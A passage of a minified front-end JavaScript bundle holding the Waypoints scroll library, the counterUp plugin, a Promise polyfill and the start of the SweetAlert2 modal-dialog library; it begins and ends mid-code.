(I.queueTrigger(a.backward), i[I.group.id] = I.group) : (!C && c || C && a.oldScroll >= I.triggerPoint) && (I.queueTrigger(a.forward), i[I.group.id] = I.group) } } return A.requestAnimationFrame(function () { for (var t in i) i[t].flushTriggers() }), this }, o.findOrCreateByElement = function (t) { return o.findByElement(t) || new o(t) }, o.refreshAll = function () { for (var t in i) i[t].refresh() }, o.findByElement = function (t) { return i[t.waypointContextKey] }, window.onload = function () { t && t(), o.refreshAll() }, A.requestAnimationFrame = function (t) { (window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || e).call(window, t) }, A.Context = o }(), function () { "use strict"; function s(t, e) { return t.triggerPoint - e.triggerPoint } function r(t, e) { return e.triggerPoint - t.triggerPoint } var e = { vertical: {}, horizontal: {} }, n = window.Waypoint; function i(t) { this.name = t.name, this.axis = t.axis, this.id = this.name + "-" + this.axis, this.waypoints = [], this.clearTriggerQueues(), e[this.axis][this.name] = this } i.prototype.add = function (t) { this.waypoints.push(t) }, i.prototype.clearTriggerQueues = function () { this.triggerQueues = { up: [], down: [], left: [], right: [] } }, i.prototype.flushTriggers = function () { for (var t in this.triggerQueues) { var e = this.triggerQueues[t], n = "up" === t || "left" === t; e.sort(n ? r : s); for (var i = 0, o = e.length; i < o; i += 1) { var a = e[i]; !a.options.continuous && i !== e.length - 1 || a.trigger([t]) } } this.clearTriggerQueues() }, i.prototype.next = function (t) { this.waypoints.sort(s); var e = n.Adapter.inArray(t, this.waypoints); return e === this.waypoints.length - 1 ? null : this.waypoints[e + 1] }, i.prototype.previous = function (t) { this.waypoints.sort(s); var e = n.Adapter.inArray(t, this.waypoints); return e ? this.waypoints[e - 1] : null }, i.prototype.queueTrigger = function (t, e) { this.triggerQueues[e].push(t) }, i.prototype.remove = function (t) { var e = n.Adapter.inArray(t, this.waypoints); -1 < e && this.waypoints.splice(e, 1) }, i.prototype.first = function () { return this.waypoints[0] }, i.prototype.last = function () { return this.waypoints[this.waypoints.length - 1] }, i.findOrCreate = function (t) { return e[t.axis][t.name] || new i(t) }, n.Group = i }(), function () { "use strict"; var n = window.jQuery, t = window.Waypoint; function i(t) { this.$element = n(t) } n.each(["innerHeight", "innerWidth", "off", "offset", "on", "outerHeight", "outerWidth", "scrollLeft", "scrollTop"], function (t, e) { i.prototype[e] = function () { var t = Array.prototype.slice.call(arguments); return this.$element[e].apply(this.$element, t) } }), n.each(["extend", "inArray", "isEmptyObject"], function (t, e) { i[e] = n[e] }), t.adapters.push({ name: "jquery", Adapter: i }), t.Adapter = i }(), function () { "use strict"; var o = window.Waypoint; function t(i) { return function () { var e = [], n = arguments[0]; return i.isFunction(arguments[0]) && ((n = i.extend({}, arguments[1])).handler = arguments[0]), this.each(function () { var t = i.extend({}, n, { element: this }); "string" == typeof t.context && (t.context = i(this).closest(t.context)[0]), e.push(new o(t)) }), e } } window.jQuery && (window.jQuery.fn.waypoint = t(window.jQuery)), window.Zepto && (window.Zepto.fn.waypoint = t(window.Zepto)) }(), function (n) { "use strict"; n.fn.counterUp = function (t) { var e = n.extend({ time: 400, delay: 10 }, t); return this.each(function () { var g = n(this), l = e; g.waypoint(function () { for (var t = l.time / l.delay, e = [i = g.attr("data-value")], n = /[0-9]+,[0-9]+/.test(i), i = i.replace(/,/g, ""), o = (/^[0-9]+$/.test(i), /^[0-9]+\.[0-9]+$/.test(i)), a = o ? (i.split(".")[1] || []).length : 0, s = t; 1 <= s; s--) { var r = parseInt(i / t * s); if (o && (r = parseFloat(i / t * s).toFixed(a)), n) for (; /(\d+)(\d{3})/.test(r.toString());)r = r.toString().replace(/(\d+)(\d{3})/, "$1,$2"); e.unshift(r) } g.data("counterup-nums", e), g.text("0"); g.data("counterup-func", function () { g.data("counterup-nums") && (g.text(g.data("counterup-nums").shift()), g.data("counterup-nums").length ? setTimeout(g.data("counterup-func"), l.delay) : (g.data("counterup-nums"), g.data("counterup-nums", null), g.data("counterup-func", null))) }), setTimeout(g.data("counterup-func"), l.delay) }, { offset: "100%", triggerOnce: !0 }) }) } }(jQuery), function (t) { function n() { for (var t = 0; t < v.length; t++)v[t][0](v[t][1]); p = !(v = []) } function i(t, e) { v.push([t, e]), p || (p = !0, y(n, 0)) } function e(t, e) { function n(t) { g(e, t) } try { t(function (t) { s(e, t) }, n) } catch (t) { n(t) } } function o(e) { var t = (n = e.owner).state_, n = n.data_, i = e[t]; if (e = e.then, "function" == typeof i) { t = b; try { n = i(n) } catch (t) { g(e, t) } } a(e, n) || (t === b && s(e, n), t === B && g(e, n)) } function a(e, n) { var i; try { if (e === n) throw new TypeError("A promises callback cannot return that same promise."); if (n && ("function" == typeof n || "object" == typeof n)) { var t = n.then; if ("function" == typeof t) return t.call(n, function (t) { i || (i = !0, (n !== t ? s : r)(e, t)) }, function (t) { i || (i = !0, g(e, t)) }), 1 } } catch (t) { return i || g(e, t), 1 } } function s(t, e) { t !== e && a(t, e) || r(t, e) } function r(t, e) { t.state_ === m && (t.state_ = f, t.data_ = e, i(c, t)) } function g(t, e) { t.state_ === m && (t.state_ = f, t.data_ = e, i(I, t)) } function l(t) { var e = t.then_; for (t.then_ = void 0, t = 0; t < e.length; t++)o(e[t]) } function c(t) { t.state_ = b, l(t) } function I(t) { t.state_ = B, l(t) } function u(t) { if ("function" != typeof t) throw new TypeError("Promise constructor takes a function argument"); if (!1 == this instanceof u) throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function."); this.then_ = [], e(t, this) } var h, d = t.Promise, C = d && "resolve" in d && "reject" in d && "all" in d && "race" in d && (new d(function (t) { h = t }), "function" == typeof h); "undefined" != typeof exports && exports ? (exports.Promise = C ? d : u, exports.Polyfill = u) : "function" == typeof define && define.amd ? define(function () { return C ? d : u }) : C || (t.Promise = u); function A() { } var p, m = "pending", f = "sealed", b = "fulfilled", B = "rejected", y = "undefined" != typeof setImmediate ? setImmediate : setTimeout, v = []; u.prototype = { constructor: u, state_: m, then_: null, data_: void 0, then: function (t, e) { var n = { owner: this, then: new this.constructor(A), fulfilled: t, rejected: e }; return this.state_ === b || this.state_ === B ? i(o, n) : this.then_.push(n), n.then }, catch: function (t) { return this.then(null, t) } }, u.all = function (s) { if ("[object Array]" !== Object.prototype.toString.call(s)) throw new TypeError("You must pass an array to Promise.all()."); return new this(function (n, t) { for (var e, i = [], o = 0, a = 0; a < s.length; a++)(e = s[a]) && "function" == typeof e.then ? e.then(function (e) { return o++, function (t) { i[e] = t, --o || n(i) } }(a), t) : i[a] = e; o || n(i) }) }, u.race = function (o) { if ("[object Array]" !== Object.prototype.toString.call(o)) throw new TypeError("You must pass an array to Promise.race()."); return new this(function (t, e) { for (var n, i = 0; i < o.length; i++)(n = o[i]) && "function" == typeof n.then ? n.then(t, e) : t(n) }) }, u.resolve = function (e) { return e && "object" == typeof e && e.constructor === this ? e : new this(function (t) { t(e) }) }, u.reject = function (n) { return new this(function (t, e) { e(n) }) } }("undefined" != typeof window ? window : "undefined" != typeof global ? global : "undefined" != typeof self ? self : this), function (t, e) { "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : t.Sweetalert2 = e() }(this, function () { "use strict"; function b(t) { return (b = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) { return typeof t } : function (t) { return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t })(t) } function i(t, e) { if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") } function o(t, e) { for (var n = 0; n < e.length; n++) { var i = e[n]; i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(t, i.key, i) } } function t(t, e, n) { return e && o(t.prototype, e), n && o(t, n), t } function a() { return (a = Object.assign || function (t) { for (var e = 1; e < arguments.length; e++) { var n = arguments[e]; for (var i in n) Object.prototype.hasOwnProperty.call(n, i) && (t[i] = n[i]) } return t }).apply(this, arguments) } function s(t) { return (s = Object.setPrototypeOf ? Object.getPrototypeOf : function (t) { return t.__proto__ || Object.getPrototypeOf(t) })(t) } function r(t, e) { return (r = Object.setPrototypeOf || function (t, e) { return t.__proto__ = e, t })(t, e) } function g(t, e, n) { return (g = function () { if ("undefined" != typeof Reflect && Reflect.construct && !Reflect.construct.sham) { if ("function" == typeof Proxy) return 1; try { return Date.prototype.toString.call(Reflect.construct(Date, [], function () { })), 1 } catch (t) { return } } }() ? Reflect.construct : function (t, e, n) { var i = [null]; i.push.apply(i, e); var o = new (Function.bind.apply(t, i)); return n && r(o, n.prototype), o }).apply(null, arguments) } function l(t, e, n) { return (l = "undefined" != typeof Reflect && Reflect.get ? Reflect.get : function (t, e, n) { var i = function (t, e) { for (; !Object.prototype.hasOwnProperty.call(t, e) && null !== (t = s(t));); return t }(t, e); if (i) { var o = Object.getOwnPropertyDescriptor(i, e); return o.get ? o.get.call(n) : o.value } })(t, e, n || t) } function c(e) { return Object.keys(e).map(function (t) { return e[t] }) } function I(t) { return Array.prototype.slice.call(t) } function X(t) { console.error("".concat(n, " ").concat(t)) } function u(t, e) { var n; n = '"'.concat(t, '" is deprecated and will be removed in the next major release. Please use "').concat(e, '" instead.'), -1 === d.indexOf(n) && (d.push(n), k(n)) } function B(t) { return t && Promise.resolve(t) === t } function e(t) { var e = {}; for (var n in t) e[t[n]] = "swal2-" + t[n]; return e } function S(e, t, n) { I(e.classList).forEach(function (t) { -1 === c(D).indexOf(t) && -1 === c(Z).indexOf(t) && e.classList.remove(t) }), t && t[n] && et(e, t[n]) } function y(t) { return "function" == typeof t ? t() : t } function h(t, e) { return t.classList.contains(e) } var n = "SweetAlert2:", k = function (t) { console.warn("".concat(n, " ").concat(t)) }, d = [], C = Object.freeze({ cancel: "cancel", backdrop: "backdrop", close: "close", esc: "esc", timer: "timer" }), D = e(["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "toast", "toast-shown", "toast-column", "fade", "show", "hide", "noanimation", "close", "title", "header", "content", "actions", "confirm", "cancel", "footer", "icon", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl"]), Z = e(["success", "warning", "info", "question", "error"]), A = { previousBodyPadding: null }; function p(t, e) { if (!e) return null; switch (e) { case "select": case "textarea": case "file": return it(t, D[e]); case "checkbox": return t.querySelector(".".concat(D.checkbox, " input")); case "radio": return t.querySelector(".".concat(D.radio, " input:checked")) || t.querySelector(".".concat(D.radio, " input:first-child")); case "range": return t.querySelector(".".concat(D.range, " input")); default: return it(t, D.input) } } function v(t) { var e; t.focus(), "file" !== t.type && (e = t.value, t.value = "", t.value = e) } function U(t, e, n) { t && e && ("string" == typeof e && (e = e.split(/\s+/).filter(Boolean)), e.forEach(function (e) { t.forEach ? t.forEach(function (t) { n ? t.classList.add(e) : t.classList.remove(e) }) : n ? t.classList.add(e) : t.classList.remove(e) })) } function W(t, e, n) { n || 0 === parseInt(n) ? t.style[e] = "number" == typeof n ? n + "px" : n : t.style.removeProperty(e) } function N(t, e) { var n = 1 < arguments.length && void 0 !== e ? e : "flex"; t.style.opacity = "", t.style.display = n } function T(t) { t.style.opacity = "", t.style.display = "none" } function H(t, e, n) { e ? N(t, n) : T(t) } function x(t) { return !(!t || !(t.offsetWidth || t.offsetHeight || t.getClientRects().length)) } function m(t) { var e = window.getComputedStyle(t), n = parseFloat(e.getPropertyValue("animation-duration") || "0"), i = parseFloat(e.getPropertyValue("transition-duration") || "0"); return 0 < n || 0 < i } function E() { return document.body.querySelector("." + D.container) } function R(t) { var e = E(); return e ? e.querySelector(t) : null } function f(t) { return R("." + t) } function F() { return I(ot().querySelectorAll("." + D.icon)) } function Y() { var t = F().filter(x); return t.length ? t[0] : null } function O() { return f(D.title) } function _() { return f(D.content) } function V() { return f(D.image) } function Q() { return f(D["progress-steps"]) } function G() { return f(D["validation-message"]) } function L() { return R("." + D.actions + " ." + D.confirm) } function M() { return R("." + D.actions + " ." + D.cancel) } function z() { return f(D.actions) } function P() { return f(D.header) } function K() { return f(D.footer) } function J() { return f(D.close) } function w() { var t = I(ot().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])')).sort(function (t, e) { return t = parseInt(t.getAttribute("tabindex")), (e = parseInt(e.getAttribute("tabindex"))) < t ? 1 : t < e ? -1 : 0 }), e = I(ot().querySelectorAll('a[href], area[href], input:not([disabled]), select:not([disabled]), textarea:not([disabled]), button:not([disabled]), iframe, object, embed, [tabindex="0"], [contenteditable], audio[controls], video[controls]')).filter(function (t) { return "-1" !== t.getAttribute("tabindex") }); return function (t) { for (var e = [], n = 0; n < t.length; n++)-1 === e.indexOf(t[n]) && e.push(t[n]); return e }(t.concat(e)).filter(x) } function j() { return "undefined" == typeof window || "undefined" == typeof document } function $(t) { te.isVisible() && tt !== t.target.value && te.resetValidationMessage(), tt = t.target.value } function q(t, e) { t instanceof HTMLElement ? e.appendChild(t) : "object" === b(t) ? gt(e, t) : t && (e.innerHTML = t) } var tt, et = function (t, e) { U(t, e, !0) }, nt = function (t, e) { U(t, e, !1) }, it = function (t, e) { for (var n = 0; n < t.childNodes.length; n++)if (h(t.childNodes[n], e)) return t.childNodes[n] }, ot = function () { return f(D.popup) }, at = function () { return !st() && !document.body.classList.contains(D["no-backdrop"]) }, st = function () { return document.body.classList.contains(D["toast-shown"]) }, rt = '\n <div aria-labelledby="'.concat(D.title, '" aria-describedby="').concat(D.content, '" class="').concat(D.popup, '" tabindex="-1">\n   <div class="').concat(D.header, '">\n     <ul class="').concat(D["progress-steps"], '"></ul>\n     <div class="').concat(D.icon, " ").concat(Z.error, '">\n       <span class="swal2-x-mark"><span class="swal2-x-mark-line-left"></span><span class="swal2-x-mark-line-right"></span></span>\n     </div>\n     <div class="').concat(D.icon, " ").concat(Z.question, '"></div>\n     <div class="').concat(D.icon, " ").concat(Z.warning, '"></div>\n     <div class="').concat(D.icon, " ").concat(Z.info, '"></div>\n     <div class="').concat(D.icon, " ").concat(Z.success, '">\n       <div class="swal2-success-circular-line-left"></div>\n       <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>\n       <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>\n       <div class="swal2-success-circular-line-right"></div>\n     </div>\n     <img class="').concat(D.image, '" />\n     <h2 class="').concat(D.title, '" id="').concat(D.title, '"></h2>\n     <button type="button" class="').concat(D.close, '">&times;</button>\n   </div>\n   <div class="').concat(D.content, '">\n     <div id="').concat(D.content, '"></div>\n     <input class="').concat(D.input, '" />\n     <input type="file" class="').concat(D.file, '" />\n     <div class="').concat(D.range, '">\n       <input type="range" />\n       <output></output>\n     </div>\n     <select class="').concat(D.select, '"></select>\n     <div class="').concat(D.radio, '"></div>\n     <label for="').concat(D.checkbox, '" class="').concat(D.checkbox, '">\n       <input type="checkbox" />\n       <span class="').concat(D.label, '"></span>\n     </label>\n     <textarea class="').concat(D.textarea, '"></textarea>\n     <div class="').concat(D["validation-message"], '" id="').concat(D["validation-message"], '"></div>\n   </div>\n   <div class="').concat(D.actions, '">\n     <button type="button" class="').concat(D.confirm, '">OK</button>\n     <button type="button" class="').concat(D.cancel, '">Cancel</button>\n   </div>\n   <div class="').concat(D.footer, '">\n   </div>\n </div>\n').replace(/(^|\n)\s*/g, ""), gt = function (t, e) { if (t.innerHTML = "", 0 in e) for (var n = 0; n in e; n++)t.appendChild(e[n].cloneNode(!0)); else t.appendChild(e.cloneNode(!0)) }, lt = function () { if (j()) return !1; var t = document.createElement("div"), e = { WebkitAnimation: "webkitAnimationEnd", OAnimation: "oAnimationEnd oanimationend", animation: "animationend" }; for (var n in e) if (e.hasOwnProperty(n) && void 0 !== t.style[n]) return e[n]; return !1 }(); function ct(t, e, n) { H(t, n["showC" + e.substring(1) + "Button"], "inline-block"), t.innerHTML = n[e + "ButtonText"], t.setAttribute("aria-label", n[e + "ButtonAriaLabel"]), t.className = D[e], S(t, n.customClass, e + "Button"), et(t, n[e + "ButtonClass"]) } function It(t, e) { t.placeholder && !e.inputPlaceholder || (t.placeholder = e.inputPlaceholder) } var ut = { promise: new WeakMap, innerParams: new WeakMap, domCache: new WeakMap }, ht = function (t, e) { var n = p(_(), t); if (n) for (var i in function (t) { for (var e = 0; e < t.attributes.length; e++) { var n = t.attributes[e].name; -1 === ["type", "value", "style"].indexOf(n) && t.removeAttribute(n) } }(n), e) "range" === t && "placeholder" === i || n.setAttribute(i, e[i]) }, dt = function (t, e, n) { t.className = e, n.inputClass && et(t, n.inputClass), n.customClass && et(t, n.customClass.input) }, Ct = {}; function At(t, g) { var l = Q(); if (!g.progressSteps || 0 === g.progressSteps.length) return T(l), 0; N(l), l.innerHTML = ""; var c = parseInt(null === g.currentProgressStep ? te.getQueueStep() : g.currentProgressStep); c >= g.progressSteps.length && k("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)"), g.progressSteps.forEach(function (t, e) { var n, i, o, a, s, r = (n = t, i = document.createElement("li"), et(i, D["progress-step"]), i.innerHTML = n, i); l.appendChild(r), e === c && et(r, D["active-progress-step"]), e !== g.progressSteps.length - 1 && (a = t, s = document.createElement("li"), et(s, D["progress-step-line"]), a.progressStepsDistance && (s.style.width = a.progressStepsDistance), o = s, l.appendChild(o)) }) } function pt(t, e) { var n, i, o, a, s, r, g, l, c, I, u, h, d, C, A, p, m, f, b, B, y, v, x, F, Q, G, w; G = e, W(w = ot(), "width", G.width), W(w, "padding", G.padding), G.background && (w.style.background = G.background), w.className = D.popup, G.toast ? (et([document.documentElement, document.body], D["toast-shown"]), et(w, D.toast)) : et(w, D.modal), S(w, G.customClass, "popup"), "string" == typeof G.customClass && et(w, G.customClass), U(w, D.noanimation, !G.animation), b = e, (Q = E()) && ("string" == typeof (F = b.backdrop) ? Q.style.background = F : F || et([document.documentElement, document.body], D["no-backdrop"]), !b.backdrop && b.allowOutsideClick && k('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`'), v = Q, (x = b.position) in D ? et(v, D[x]) : (k('The "position" parameter is not valid, defaulting to "center"'), et(v, D.center)), !(B = b.grow) || "string" != typeof B || (y = "grow-" + B) in D && et(Q, D[y]), S(Q, b.customClass, "container"), b.customContainerClass && et(Q, b.customContainerClass)), I = t, u = e, S(P(), u.customClass, "header"), At(0, u), p = u, (f = ut.innerParams.get(I)) && p.type === f.type && Y() ? S(Y(), p.customClass, "icon") : (mt(), p.type && (ft(), -1 !== Object.keys(Z).indexOf(p.type) ? (N(m = R(".".concat(D.icon, ".").concat(Z[p.type]))), S(m, p.customClass, "icon"), U(m, "swal2-animate-".concat(p.type, "-icon"), p.animation)) : X('Unknown type! Expected "success", "error", "warning", "info" or "question", got "'.concat(p.type, '"')))), function (t) { var e = V(); if (!t.imageUrl) return T(e); N(e), e.setAttribute("src", t.imageUrl), e.setAttribute("alt", t.imageAlt), W(e, "width", t.imageWidth), W(e, "height", t.imageHeight), e.className = D.image, S(e, t.customClass, "image"), t.imageClass && et(e, t.imageClass) }(u), C = u, H(A = O(), C.title || C.titleText), C.title && q(C.title, A), C.titleText && (A.innerText = C.titleText), S(A, C.customClass, "title"), h = u, S(d = J(), h.customClass, "closeButton"), H(d, h.showCloseButton), d.setAttribute("aria-label", h.closeButtonAriaLabel), g = t, l = e, c = _().querySelector("#" + D.content), l.html ? (q(l.html, c), N(c, "block")) : l.text ? (c.textContent = l.text, N(c, "block")) : T(c), function (t) { for (var e = ut.innerParams.get(g), n = !e || t.input !== e.input, i = _(), o = ["input", "file", "range", "select", "radio", "checkbox", "textarea"], a = 0; a < o.length; a++) { var s = D[o[a]], r = it(i, s); ht(o[a], t.inputAttributes), dt(r, s, t), n && T(r) } if (t.input) { if (!Ct[t.input]) return X('Unexpected type of input! Expected "text", "email", "password", "number", "tel", "select", "radio", "checkbox", "textarea", "file" or "url", got "'.concat(t.input, '"')); n && N(Ct[t.input](t)) } }(l), S(_(), l.customClass, "content"), o = e, a = z(), s = L(), r = M(), (o.showConfirmButton || o.showCancelButton ? N : T)(a), S(a, o.customClass, "actions"), ct(s, "confirm", o), ct(r, "cancel", o), o.buttonsStyling ? function (t, e, n) { et([t, e], D.styled), n.confirmButtonColor && (t.style.backgroundColor = n.confirmButtonColor), n.cancelButtonColor && (e.style.backgroundColor = n.cancelButtonColor); var i = window.getComputedStyle(t).getPropertyValue("background-color"); t.style.borderLeftColor = i, t.style.borderRightColor = i }(s, r, o) : (nt([s, r], D.styled), s.style.backgroundColor = s.style.borderLeftColor = s.style.borderRightColor = "", r.style.backgroundColor = r.style.borderLeftColor = r.style.borderRightColor = ""), n = e, H(i = K(), n.footer), n.footer && q(n.footer, i), S(i, n.customClass, "footer") } Ct.text = Ct.email = Ct.password = Ct.number = Ct.tel = Ct.url = function (t) { var e = it(_(), D.input); return "string" == typeof t.inputValue || "number" == typeof t.inputValue ? e.value = t.inputValue : B(t.inputValue) || k('Unexpected type of inputValue! Expected "string", "number" or "Promise", got "'.concat(b(t.inputValue), '"')), It(e, t), e.type = t.input, e }, Ct.file = function (t) { var e = it(_(), D.file); return It(e, t), e.type = t.input, e }, Ct.range = function (t) { var e = it(_(), D.range), n = e.querySelector("input"), i = e.querySelector("output"); return n.value = t.inputValue, n.type = t.input, i.value = t.inputValue, e }, Ct.select = function (t) { var e, n = it(_(), D.select); return n.innerHTML = "", t.inputPlaceholder && ((e = document.createElement("option")).innerHTML = t.inputPlaceholder, e.value = "", e.disabled = !0, e.selected = !0, n.appendChild(e)), n }, Ct.radio = function () { var t = it(_(), D.radio); return t.innerHTML = "", t }, Ct.checkbox = function (t) { var e = it(_(), D.checkbox), n = p(_(), "checkbox"); return n.type = "checkbox", n.value = 1, n.id = D.checkbox, n.checked = Boolean(t.inputValue), e.querySelector("span").innerHTML = t.inputPlaceholder, e }, Ct.textarea = function (t) { var e = it(_(), D.textarea); return e.value = t.inputValue, It(e, t), e }; var mt = function () { for (var t = F(), e = 0; e < t.length; e++)T(t[e]) }, ft = function () { for (var t = ot(), e = window.getComputedStyle(t).getPropertyValue("background-color"), n = t.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix"), i = 0; i < n.length; i++)n[i].style.backgroundColor = e }; function bt() { var t = ot(); t || te.fire(""), t = ot(); var e = z(), n = L(), i = M(); N(e), N(n), et([t, e], D.loading), n.disabled = !0, i.disabled = !0, t.setAttribute("data-loading", !0), t.setAttribute("aria-busy", !0), t.focus() } function Bt(t) { return Qt.hasOwnProperty(t) } function yt(t) { return wt[t] } var vt = [], xt = {}, Ft = function () { return new Promise(function (t) { var e = window.scrollX, n = window.scrollY; xt.restoreFocusTimeout = setTimeout(function () { xt.previousActiveElement && xt.previousActiveElement.focus ? (xt.previousActiveElement.focus(), xt.previousActiveElement = null) : document.body && document.body.focus(), t() }, 100), void 0 !== e && void 0 !== n && window.scrollTo(e, n) }) }, Qt = { title: "", titleText: "", text: "", html: "", footer: "", type: null, toast: !1, customClass: "", customContainerClass: "", target: "body", backdrop: !0, animation: !0, heightAuto: !0, allowOutsideClick: !0, allowEscapeKey: !0, allowEnterKey: !0, stopKeydownPropagation: !0, keydownListenerCapture: !1, showConfirmButton: !0, showCancelButton: !1, preConfirm: null, confirmButtonText: "OK", confirmButtonAriaLabel: "", confirmButtonColor: null, confirmButtonClass: "", cancelButtonText: "Cancel", cancelButtonAriaLabel: "", cancelButtonColor: null, cancelButtonClass: "", buttonsStyling: !0, reverseButtons: !1, focusConfirm: !0, focusCancel: !1, showCloseButton: !1, closeButtonAriaLabel: "Close this dialog", showLoaderOnConfirm: !1, imageUrl: null, imageWidth: null, imageHeight: null, imageAlt: "", imageClass: "", timer: null, width: null, padding: null, background: null, input: null, inputPlaceholder: "", inputValue: "", inputOptions: {}, inputAutoTrim: !0, inputClass: "", inputAttributes: {}, inputValidator: null, validationMessage: null, grow: !1, position: "center", progressSteps: [], currentProgressStep: null, progressStepsDistance: null, onBeforeOpen: null, onAfterClose: null, onOpen: null, onClose: null, scrollbarPadding: !0 }, Gt = ["title", "titleText", "text", "html", "type", "customClass", "showConfirmButton", "showCancelButton", "confirmButtonText", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonClass", "cancelButtonText", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonClass", "buttonsStyling", "reverseButtons", "imageUrl", "imageWidth", "imageHeigth", "imageAlt", "imageClass", "progressSteps", "currentProgressStep"], wt = { customContainerClass: "customClass", confirmButtonClass: "customClass", cancelButtonClass: "customClass", imageClass: "customClass", inputClass: "customClass" }, Xt = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusCancel", "heightAuto", "keydownListenerCapture"], St = Object.freeze({ isValidParameter: Bt, isUpdatableParameter: function (t) { return -1 !== Gt.indexOf(t) }, isDeprecatedParameter: yt, argsToParams: function (n) { var i = {}; switch (b(n[0])) { case "object": a(i, n[0]); break; default: ["title", "html", "type"].forEach(function (t, e) { switch (b(n[e])) { case "string": i[t] = n[e]; break; case "undefined": break; default: X("Unexpected type of ".concat(t, '! Expected "string", got ').concat(b(n[e]))) } }) }return i }, isVisible: function () { return x(ot()) }, clickConfirm: function () { return L() && L().click() }, clickCancel: function () { return M() && M().click() }, getContainer: E, getPopup: ot, getTitle: O, getContent: _, getImage: V, getIcon: Y, getIcons: F, getCloseButton: J, getActions: z, getConfirmButton: L, getCancelButton: M, getHeader: P, getFooter: K, getFocusableElements: w, getValidationMessage: G, isLoading: function () { return ot().hasAttribute("data-loading") }, fire: function () { for (var t = arguments.length, e = new Array(t), n = 0; n < t; n++)e[n] = arguments[n]; return g(this, e) }, mixin: function (e) { return function (t, e) { if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function"); t.prototype = Object.create(e && e.prototype, { constructor: { value: t, writable: !0, configurable: !0 } }), e && r(t, e) }(n, this), t(n, [{ key: "_main", value: function (t) { return l(s(n.prototype), "_main", this).call(this, a({}, e, t)) } }]), n; function n() { return i(this, n), t = this, !(e = s(n).apply(this, arguments)) || "object" != typeof e && "function" != typeof e ? function (t) { if (void 0 === t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return t }(t) : e; var t, e } }, queue: function (t) { var a = this; function s(t, e) { vt = [], document.body.removeAttribute("data-swal2-queue-step"), t(e) } vt = t; var r = []; return new Promise(function (o) { !function e(n, i) { n < vt.length ? (document.body.setAttribute("data-swal2-queue-step", n), a.fire(vt[n]).then(function (t) { void 0 !== t.value ? (r.push(t.value), e(n + 1, i)) : s(o, { dismiss: t.dismiss }) })) : s(o, { value: r }) }(0) }) }, getQueueStep: function () { return document.body.getAttribute("data-swal2-queue-step") }, insertQueueStep: function (t, e) { return e && e < vt.length ? vt.splice(e, 0, t) : vt.push(t) }, deleteQueueStep: function (t) { void 0 !== vt[t] && vt.splice(t, 1) }, showLoading: bt, enableLoading: bt, getTimerLeft: function () { return xt.timeout && xt.timeout.getTimerLeft() }, stopTimer: function () { return xt.timeout && xt.timeout.stop() }, resumeTimer: function () { return xt.timeout && xt.timeout.start() }, toggleTimer: function () { var t = xt.timeout; return t && (t.running ? t.stop() : t.start()) }, increaseTimer: function (t) { return xt.timeout && xt.timeout.increase(t) }, isTimerRunning: function () { return xt.timeout && xt.timeout.isRunning() } }); function kt() { var t = ut.innerParams.get(this), e = ut.domCache.get(this); t.showConfirmButton || (T(e.confirmButton), t.showCancelButton || T(e.actions)), nt([e.popup, e.actions], D.loading), e.popup.removeAttribute("aria-busy"), e.popup.removeAttribute("data-loading"), e.confirmButton.disabled = !1, e.cancelButton.disabled = !1 } function Dt() { return window.MSInputMethodContext && document.documentMode } function Zt() { var t = E(), e = ot(); t.style.removeProperty("align-items"), e.offsetTop < 0 && (t.style.alignItems = "flex-start") } var Ut = function () { null !== A.previousBodyPadding && (document.body.style.paddingRight = A.previousBodyPadding + "px", A.previousBodyPadding = null) }, Wt = function () { var t; h(document.body, D.iosfix) && (t = parseInt(document.body.style.top, 10), nt(document.body, D.iosfix), document.body.style.top = "", document.body.scrollTop = -1 * t) }, Nt = function () { "undefined" != typeof window && Dt() && window.removeEventListener("resize", Zt) }, Tt = function () { I(document.body.children).forEach(function (t) { t.hasAttribute("data-previous-aria-hidden") ? (t.setAttribute("aria-hidden", t.getAttribute("data-previous-aria-hidden")), t.removeAttribute("data-previous-aria-hidden")) : t.removeAttribute("aria-hidden") }) }, Ht = { swalPromiseResolve: new WeakMap }; function Et(t, e, n) { e ? Ot(n) : (Ft().then(function () { return Ot(n) }), xt.keydownTarget.removeEventListener("keydown", xt.keydownHandler, { capture: xt.keydownListenerCapture }), xt.keydownHandlerAdded = !1), delete xt.keydownHandler, delete xt.keydownTarget, t.parentNode && t.parentNode.removeChild(t), nt([document.documentElement, document.body], [D.shown, D["height-auto"], D["no-backdrop"], D["toast-shown"], D["toast-column"]]), at() && (Ut(), Wt(), Nt(), Tt()) } function Rt(t) { var e, n, i, a, s = E(), r = ot(); r && !h(r, D.hide) && (e = ut.innerParams.get(this), n = Ht.swalPromiseResolve.get(this), i = e.onClose, a = e.onAfterClose, nt(r, D.show), et(r, D.hide), lt && m(r) ? r.addEventListener(lt, function (t) { var e, n, i, o; t.target === r && (e = r, n = s, i = st(), o = a, h(e, D.hide) && Et(n, i, o), Yt(ut), Yt(Ht)) }) : Et(s, st(), a), null !== i && "function" == typeof i && i(r), n(t || {}), delete this.params) } function Yt(t) { for (var e in t) t[e] = new WeakMap } var Ot = function (t) { null !== t && 